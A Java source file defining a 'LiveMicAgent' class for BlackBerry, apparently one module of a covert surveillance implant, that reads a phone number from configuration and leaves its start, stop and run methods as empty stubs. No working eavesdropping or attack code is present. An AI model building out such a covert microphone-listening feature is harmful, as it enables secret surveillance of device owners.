package blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.Conf;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

public class LiveMicAgent extends Agent {
    //#ifdef DEBUG
    private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
    //#endif
    
    String number;
    
    public LiveMicAgent(final boolean agentStatus) {
        super(Agent.AGENT_LIVE_MIC, agentStatus,  Conf.AGENT_LIVEMIC_ON_SD, "LiveMicAgent");
        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.MIC,
                "Wrong Conversion");
        //#endif
    }
    
    public LiveMicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }
    
    protected boolean parse(byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            int len = databuffer.readInt();
            byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);
            
        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("number: " + number);
        //#endif
        return true;
    }

    protected void actualStart() {
        // TODO Auto-generated method stub
    }
    protected void actualStop() {
        // TODO Auto-generated method stub
    }
    protected void actualRun() {
        // TODO Auto-generated method stub
    }

}
